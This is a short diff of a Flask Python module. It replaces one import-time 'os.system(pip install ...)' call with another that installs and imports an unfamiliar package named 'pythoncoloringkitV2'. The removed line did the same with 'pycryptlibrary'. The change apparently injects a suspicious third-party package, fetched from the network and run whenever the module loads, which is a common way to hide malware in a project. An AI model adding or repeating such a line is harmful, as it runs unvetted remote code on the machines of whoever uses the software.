@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pycryptlibrary")
-import pycryptlibrary
+os.system("pip install pythoncoloringkitV2")
+import pythoncoloringkitV2
 import flask
 
 from flask import g
